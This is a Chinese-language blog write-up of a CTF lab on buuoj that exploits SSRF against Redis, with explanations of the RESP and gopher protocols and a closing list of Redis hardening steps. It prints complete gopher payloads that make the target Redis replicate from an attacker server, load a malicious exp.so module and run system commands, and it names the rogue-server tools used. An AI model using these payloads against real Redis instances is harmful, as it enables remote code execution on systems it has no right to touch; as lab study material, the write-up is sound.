+<h3 id="SSRF-Redis反弹shell模拟环境"><a href="#SSRF-Redis反弹shell模拟环境" class="headerlink" title="SSRF Redis反弹shell模拟环境"></a>SSRF Redis反弹shell模拟环境</h3><p><strong>靶机地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/">https://buuoj.cn/</a></strong><br>除了暗月的靶机，在 buuoj 中也提供了该题目，感兴趣的同学可注册会员来做这题题目<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%8811.02.03.png" alt="截屏2021-11-01 上午11.02.03"></p>
+<p>同时需要有个小号创建一个攻击机来访问内网用于支撑 redis 主服务，通过<code>root/123456</code>进行连接<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%8811.07.41.png" alt="截屏2021-11-01 上午11.07.41"></p>
+<p>借助工具</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">https://github.com/xmsec/redis-ssrf</span> <span class="string">//主要应用于模拟redis服务，转换脚本</span></span><br><span class="line"><span class="string">https://github.com/n0b0dyCN/redis-rogue-server</span> <span class="string">//提供恶意exp</span></span><br></pre></td></tr></table></figure>
+
+<p>通过 sftp 将工具上传到服务器上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sftp -P 29197 root@node4.buuoj.cn</span><br><span class="line">sftp &gt; put -r 想要传的文件夹 服务器目标位置</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%882.45.54.png" alt="截屏2021-11-01 下午2.45.54"></p>
+<p>发现 hint.php 文件并存在本地条件判断绕过<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%8811.10.27.png" alt="截屏2021-11-01 上午11.10.27"></p>
+<p>访问<code>index.php?url=http://0.0.0.0/hint.php</code>，成功获取 redis 密码为root<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%8811.16.24.png" alt="截屏2021-11-01 上午11.16.24"></p>
+<p>在服务器上开启 redis 作为主服务器，需要将<code>redis-rogue-server</code>中的<code>exp.so</code>复制到<code>redis-server</code>目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rogue-server.py</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%882.55.24.png" alt="截屏2021-11-01 下午2.55.24"></p>
+<p>将<code>redis-ssrf</code>中的<code>ssrf-redis.py</code>的 lhost 修改为服务器IP地址：172.16.174.216 ，端口不变默认为6666端口<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.03.25.png" alt="截屏2021-11-01 下午4.03.25"></p>
+<p>添加密码为root，ip为0.0.0.0<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.03.33.png" alt="截屏2021-11-01 下午4.03.33"></p>
+<p>运行python脚本并生成 payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ssrf-redis.py</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.04.46.png" alt="截屏2021-11-01 下午4.04.46"></p>
+<p>将结果进行 url 二次编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A%2F%2F0.0.0.0%3A6379%2F_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25244%250D%250Aroot%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252414%250D%250A172.16.174.216%250D%250A%25244%250D%250A6666%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A%2Ftmp%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A%2Ftmp%2Fexp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%25246%250D%250Awhoami%250D%250A%252A1%250D%250A%25244%250D%250Aquit</span><br></pre></td></tr></table></figure>
+<p>引入该 payload，但是执行失败<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.07.13.png" alt="截屏2021-11-01 下午4.07.13"></p>
+<p>猜测可能是靶机无法连接的问题，于是切换到自己服务器下并重新设置<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.37.29.png" alt="截屏2021-11-01 下午4.37.29"></p>
+<p>经过 url 二次编码后的 payload 如下：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">gopher%3A%2F%2F0.0.0.0%3A6379%2F_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25244%250D%250Aroot%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252412%250D%250A1.117.58.131%250D%250A%25244%250D%250A6666%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A%2Ftmp%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A%2Ftmp%2Fexp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%25246%250D%250Awhoami%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A</span></span><br></pre></td></tr></table></figure>
+
+<p>成功返回命令<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.39.22.png" alt="截屏2021-11-01 下午4.39.22"></p>
+<p>接下来修改命令为<code>dir /</code>，但是<code>rogue-server.py</code>起不来了，出现这个错误的原因是<code>exp.so</code>没传完，需要使用<code>rogue-server.py</code>来执行一个死循环，编写 shell 脚本如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> [ <span class="string">&quot;1&quot;</span> = <span class="string">&quot;1&quot;</span> ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	python rogue-server.py</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p>执行后发现存在多个文件，在其中存在flag，同时将修改命令为<code>cat /flag</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.45.07.png" alt="截屏2021-11-01 下午4.45.07"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.46.26.png" alt="截屏2021-11-01 下午4.46.26"></p>
+<p>成功拿到flag为<code>flag&#123;e3ac7c35-8639-40dc-b753-b48ca7fc5c89&#125;</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.47.03.png" alt="截屏2021-11-01 下午4.47.03"></p>
+<h3 id="知识拓展"><a href="#知识拓展" class="headerlink" title="知识拓展"></a>知识拓展</h3><h4 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h4><p>redis客户端与服务端通信，使用RESP（Redis Serialization Protocol，Redis序列化协议）进行通信，该协议是专门为redis设计的通信协议，也可以用于其他客户端-服务器通信的场景，RESP可以用于序列化不通过的数据类型。如整数、字符串、数组等，并且为错误提供专门的类型。客户端发送请求时，以字符串数组作为待执行命令的参数。redis服务器可根据不同的命令返回不同的数据类型。</p>
+<p>支持的数据类型包括以下几种</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">、简单字符串（simple</span> <span class="string">strings）</span></span><br><span class="line"><span class="number">2</span><span class="string">、错误数据（errors）</span></span><br><span class="line"><span class="number">3</span><span class="string">、整数（integers）</span></span><br><span class="line"><span class="number">4</span><span class="string">、批量字符串（bulk</span> <span class="string">strings）</span></span><br><span class="line"><span class="number">5</span><span class="string">、数组（Arrays）</span></span><br></pre></td></tr></table></figure>
+
+<p>其中<code>*3</code>代表数组的长度为3，返回具体内容可能为<code>([&quot;set&quot;,&quot;name&quot;,&quot;Sn0w&quot;])</code>，$4代表字符串的长度也就是Sn0w，0d0a即\r\n，代表结束符，<code>+OK</code>表示服务端执行成功后返回的字符串</p>
+<h4 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h4><p>在http出现之前，访问网页需要通过gopher协议进行访问，它支持get、post请求，被取代的一方面原因是收费，另一方面原因是它的结构没有html网页灵活。虽然这是一种古老的协议，但是许多服务都支持gopher来进行访问，在渗透测试中常用于攻击ftp、redis、telnet、smtp等服务，还可以利用redis来反弹shell。</p>
+<p>gopher协议格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:70+TCP/IP数据</span><br></pre></td></tr></table></figure>
+<p>它的默认端口为70，那么它是怎么实现数据传输的呢？gopher会将数据部分发送给对应的端口，这些数据可以使字符串，也可以是其他的数据请求包，包括get、post请求等，同时数据部分必须要经过url编码，之后才能正确解析。</p>
+<p>curl和libcurl命令也支持gopher协议，如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.15.131/_*2</span><br></pre></td></tr></table></figure>
+<p>那么我们可以思考 gopher 语言如何生成呢？<br>在windows、linux中的转换规则稍有不同，windows在行尾使用CRLF（0d 0a）、Unix则只使用LF（0a），直接直接url编码即可，但是需要明确的是编码规则是url16进制编码<br><strong>生成工具：<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></strong></p>
+<h2 id="0x04-Redis安全防护"><a href="#0x04-Redis安全防护" class="headerlink" title="0x04 Redis安全防护"></a>0x04 Redis安全防护</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、绑定内网IP地址进行访问</span><br><span class="line">2、通过requirepass来设置redis密码</span><br><span class="line">3、开启保护模式，即protected-mode yes，默认开启</span><br><span class="line">4、更改redis默认端口</span><br><span class="line">5、为redis服务设置一个普通权限账号</span><br></pre></td></tr></table></figure>
+<p>以上设置完毕后，需要加载配置文件来启动redis</p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/1f68479/">在线密码破解工具开发<span class="note">Older</span></a><div class="line"></div><a id="prev" href="/post/f10b0bf1/">数据库攻防之MongoDB渗透基础<span class="note">Newer</span></a></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
